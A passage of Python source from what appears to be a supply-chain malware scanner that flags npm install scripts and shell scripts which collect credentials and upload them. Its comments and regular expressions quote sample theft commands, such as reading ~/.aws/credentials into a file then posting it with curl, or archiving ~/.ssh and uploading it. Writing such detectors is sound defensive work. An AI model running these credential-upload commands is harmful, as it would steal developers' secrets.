                continue
            command = _shell_command_text(name, call)
            if command and _any_statement_uploads(command):
                found.append(f.evidence_for_lines(
                    call.lineno, getattr(call, "end_lineno", None) or call.lineno
                ))
                if len(found) >= MAX_EVIDENCE_SCANNED:
                    return found
    for f in index.select(suffixes=_JS_SUFFIXES):
        if not _may_hold_upload_command(f.text):
            continue
        text = f.interop_view()
        for m in exec_call_pattern(f).finditer(text):
            if f.in_c_comment(m.start()):
                continue
            end = _call_end(text, m.end())
            # Each string is a command line of its own (`exec("cat ... | curl ...")`); the pieces
            # of an argument list are not joined, so a lone "env" word is not read as a dump.
            if any(_any_statement_uploads(s) for s in _string_literals(text, m.end(), end)):
                found.append(f.evidence_for_span(m.start(), end))
                if len(found) >= MAX_EVIDENCE_SCANNED:
                    return found
    return found


def _any_statement_uploads(command: str) -> bool:
    commands = [c for _b, _e, c in _command_lines(command)]
    return any(secret_upload(c, strict=True) is not None for c in commands) or (
        staged_upload_lines(commands, strict=True) is not None
    )


# --- a script that collects a credential first and sends it on a later line ------------------
# The real install-time stealers (the wfx campaign, November 2026) never read and send in one
# command: `cat ~/.aws/credentials >> "$out"`, then `curl --data-binary @"$out" http://...`.
# A line that reads a credential (a credential path, the whole environment, a token command) and
# writes the result to a file (`> F`, `>> F`, `| tee F`) or a variable (`V=$(...)`) marks that
# file or variable; a later line in which a network client uploads it is the send. A marked name
# used as a header (`-H "Authorization: Bearer $TOKEN"`) is how a credential is used, not sent,
# and a provider's token sent to the provider's own hosts is its use too.
_REDIRECT_TO = re.compile(r"(?:>>?|\btee(?:\s+-a)?)\s*([\"']?)(\$\{?\w+\}?|[\w./~-]+)\1")
_ASSIGN_FROM = re.compile(r"^\s*(?:export\s+|local\s+|readonly\s+)?([A-Za-z_]\w*)=[\"']?(?:\$\(|`)")
# Where a network client takes data to upload. `@NAME` is curl's "the contents of this file".
_UPLOAD_OPTION = (
    r"(?:-d|--data(?:-binary|-raw|-urlencode|-ascii)?|-F|--form|-T|--upload-file|--post-file|"
    r"--post-data|--body-file|--body-data|-InFile|-Body)"
)
_MAX_STAGED_LINES = 5000
_STAGED_SPAN = 3
# Files and variables followed per script. A real stealer collects into one or two; every name
# is tried against every later line that runs a network client, and a script crafted with
# hundreds of both took minutes.
_MAX_MARKED = 40


def _name_patterns(name: str, encoded: bool = False) -> list[re.Pattern[str]]:
    """Ways a line can hand the marked file or variable ``name`` to a network client as data, or
    publish it (``gh gist create``); for data that was encoded when collected, also a DNS lookup
    of a name built from it."""
    if name.startswith("$"):
        bare = re.escape(name.strip("${}"))
        ref = rf"\$\{{?{bare}\}}?(?![\w])"
    else:
        ref = rf"{re.escape(name)}(?![\w./-])"
    patterns = [
        re.compile(rf"@[\"']?{ref}"),
        re.compile(rf"{_UPLOAD_OPTION}(?:\s+|=)[\"']?[^\s\"']*{ref}"),
        re.compile(rf"<\s*[\"']?{ref}"),
        re.compile(rf"\bcat\s+[\"']?{ref}[\"']?\s*\|"),
        re.compile(rf"\bgh\s+gist\s+create\b[^\n|;&]{{0,200}}?{ref}"),
    ]
    if encoded:
        patterns.append(re.compile(rf"\b(?:nslookup|dig|host)\s[^\n|;&]{{0,200}}?{ref}"))
    return patterns


# An archive of credential locations is a file that holds them: `tar czf /tmp/s.tgz ~/.aws ~/.ssh`,
# `zip -r backup.zip . ~/.ssh`, then `curl -F f=@/tmp/s.tgz ...`. (`tar czf - ~/.ssh | curl ...`
# is one command, read by ``secret_upload``.)
_ARCHIVE_TO = re.compile(
    r"\btar\s+(?:-[A-Za-z]+\s+){0,3}(?:-?[A-Za-z]*c[A-Za-z]*f|(?:--create|-c)\b[^\n|;&]{0,80}?"
    r"(?:\s-f|\s--file))[=\s]\s*[\"']?(\$\{?\w+\}?|[\w./~-]+)"
    r"|\b(?:zip|7za?\s+a)\b(?:\s+-[\w-]+){0,6}\s+[\"']?(\$\{?\w+\}?|[\w./~-]+)"
)
# `for f in ~/.ssh/id_*; do curl -F "k=@$f" ...`: the loop variable names each credential file.
_FOR_IN = re.compile(r"\s*for\s+([A-Za-z_]\w*)\s+in\s")


def staged_upload_lines(lines: list[str], *, strict: bool = False) -> tuple[int, int] | None:
    """``(read_line, send_line)``, 1-based, of a credential collected into a file, an archive or
    a variable on one line and uploaded by a network client on a later one, or None. ``strict``
    as in :func:`secret_upload`."""
    marked: dict[str, tuple[int, tuple[str, ...], bool]] = {}
    patterns: dict[str, list[re.Pattern[str]]] = {}
    for no, raw in enumerate(lines[:_MAX_STAGED_LINES], start=1):
        if raw.lstrip().startswith("#"):
            continue
        line = _HOME.sub("~", raw)
        if marked and (
            _NET_CLIENT.search(line) or _INLINE_NET.search(line)
            or _PUBLISHES_FILE.search(line) or _DNS_LOOKUP.search(line)
        ):
            hosts = _hosts(line)
            local = strict and bool(hosts) and all(_loopback(h) for h in hosts)
            unnamed = strict and (not hosts or any("$" in h for h in hosts))
            for name, (read_at, own_hosts, encoded) in marked.items():
                if own_hosts and hosts and all(h.endswith(own_hosts) for h in hosts):
                    continue
                if local or (own_hosts and unnamed):
                    continue
                if name not in patterns:
                    patterns[name] = _name_patterns(name, encoded)
                if any(p.search(line) for p in patterns[name]):
                    return read_at, no
        source = _credential_source(line, strict)
        if source is None:
            continue
        at, own_hosts = source
        names = [m.group(2) for m in _REDIRECT_TO.finditer(line, at)]
        names += [m.group(1) or m.group(2) for m in _ARCHIVE_TO.finditer(line, 0, at)]
        assign = _ASSIGN_FROM.match(line)
        if assign and assign.end() <= at:
            names.append("$" + assign.group(1))
        loop = _FOR_IN.match(line)
        if loop and loop.end() <= at:
            names.append("$" + loop.group(1))
        for name in names:
            if name.startswith("/dev/") or name == "-" or len(marked) >= _MAX_MARKED:
                continue
            marked.setdefault(name, (no, own_hosts, bool(_ENCODES.search(line))))
    return None


def _credential_source(line: str, strict: bool = False) -> tuple[int, tuple[str, ...]] | None:
    """Offset of what the line reads that holds credentials, and the hosts it may go to, or None."""
    for m in _credential_paths(line):
        if _not_sent(line, m, strict):
            continue
        return m.start(), ()
    m = _env_dump(line)
    if m:
        return m.start(), ()
    for pattern, own_hosts in _TOKEN_COMMANDS:
        m = pattern.search(line)
        if m:
            return m.start(), own_hosts
    return None


# A login token an install script has no reason to put into a web address: it is used as a header
# (`Authorization: Bearer …`) with the service that issued it. Written into the address itself
# (`"https://host/t?n=" + process.env.NPM_TOKEN`, `` `https://host/${process.env.GH_TOKEN}` ``) it
# reaches whoever runs the host and stays in that host's logs.
_JS_TOKEN_IN_URL = re.compile(
    r"https?://([^/\s\"'`?#$]{1,200})[^\"'`\n]{0,300}"
    r"(?:[\"'`]\s{0,10}\+\s{0,10}(?:encodeURIComponent\s*\(\s{0,10})?|\$\{\s{0,10}(?:encodeURIComponent\s*\(\s{0,10})?)"
    r"process\.env\.(NPM_TOKEN|NODE_AUTH_TOKEN|NPM_AUTH_TOKEN|GITHUB_TOKEN|GH_TOKEN|GITLAB_TOKEN|"
    r"CI_JOB_TOKEN|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|OPENAI_API_KEY|ANTHROPIC_API_KEY)\b"
)
# The service a token belongs to: sent there it is used, not taken.
_TOKEN_OWN_HOSTS = {
    "NPM_TOKEN": ("npmjs.org", "npmjs.com"),
    "NODE_AUTH_TOKEN": ("npmjs.org", "npmjs.com", "github.com"),
    "NPM_AUTH_TOKEN": ("npmjs.org", "npmjs.com"),
    "GITHUB_TOKEN": ("github.com", "githubusercontent.com"),
    "GH_TOKEN": ("github.com", "githubusercontent.com"),
    "GITLAB_TOKEN": ("gitlab.com",),
    "CI_JOB_TOKEN": ("gitlab.com",),
    "AWS_SECRET_ACCESS_KEY": ("amazonaws.com",),
    "AWS_SESSION_TOKEN": ("amazonaws.com",),
    "OPENAI_API_KEY": ("openai.com",),
    "ANTHROPIC_API_KEY": ("anthropic.com",),
}
# The same tokens as a shell or PowerShell variable in a command.
_TOKEN_VARIABLE = re.compile(
    r"\$(?:[eE]nv:)?\{?(" + "|".join(_TOKEN_OWN_HOSTS) + r")\}?(?![\w])"
)
# A model provider's key is also what a gateway or a compatible endpoint is called with.
_GATEWAY_KEYS = frozenset({"OPENAI_API_KEY", "ANTHROPIC_API_KEY"})
# More places a token is honestly sent from a command: GitHub's container registry, and a GitLab
# the project hosts itself (the usual way to run GitLab).
_COMMAND_OWN_HOSTS = {"GITHUB_TOKEN": ("ghcr.io",), "GH_TOKEN": ("ghcr.io",)}
_GITLAB_NAMES = frozenset({"GITLAB_TOKEN", "CI_JOB_TOKEN"})


def _own_host(token: str, host: str) -> bool:
    """True if ``host`` belongs to the service that issued the token named ``token``."""
    token = token.upper()
    host = host.rsplit("@", 1)[-1].split(":", 1)[0]
    own = _TOKEN_OWN_HOSTS.get(token, ()) + _COMMAND_OWN_HOSTS.get(token, ())
    if any(host == o or host.endswith("." + o) for o in own):
        return True
    return token in _GITLAB_NAMES and "gitlab" in host


def _js_token_in_url(f: IndexedFile) -> Evidence | None:
    """The first place a JavaScript install script writes a named login token into the address of
    a host that is not the token's own service."""
    for m in _JS_TOKEN_IN_URL.finditer(f.text):
        host = m.group(1).lower().rsplit("@", 1)[-1].split(":", 1)[0]
        if any(host == own or host.endswith("." + own) for own in _TOKEN_OWN_HOSTS[m.group(2)]):
            continue
        # A host name is compared here; nothing binds to it (the reason for the nosec below).
        local = host in ("localhost", "0.0.0.0", "[") or host.startswith("127.")  # nosec B104
        if local or f.in_c_comment(m.start()):
            continue
        return f.evidence_for_span(m.start(), m.end())
    return None


def _install_evidence(index: FileIndex, by_path: dict[str, IndexedFile]) -> list[Evidence]:
    """npm install-time scripts that upload a credential, inline or through a script they run."""
    found: list[Evidence] = []
    for f in index.select(names=("package.json",)):
        for _name, command, start, end in npm_install_commands(f, _NPM_LIFECYCLE_SCRIPTS):
            if secret_upload(command) is not None:
                found.append(f.evidence_for_span(start, end))
                continue
            ev = _run_script_evidence(command, f.relpath, by_path)
            if ev is not None:
                found.append(ev)
    # A shell script the install reaches through another file (`postinstall` -> `setup.js` ->
    # `payload.sh`, a script that starts a second one, a suffix-less file with a shell first line)
    # runs at install like the one the command names.
    shell_run, _node_run = install_run_interpreters(index)
    seen = {(ev.file, ev.line_start) for ev in found}
    for script in index.files:
        if script.relpath not in index.install_scripts:
            continue
        if script.suffix in _JS_SUFFIXES or script.relpath in _node_run:
            ev = _js_token_in_url(script)
            if ev is not None:
                found.append(ev)
            continue
        if not (script.suffix in _SHELL_SUFFIXES or script.relpath in shell_run
                or (script.suffix == "" and script.is_shell_like)):
            continue
        ev = _shell_script_upload(script)
        if ev is not None and (ev.file, ev.line_start) not in seen:
            seen.add((ev.file, ev.line_start))
            found.append(ev)
    return found
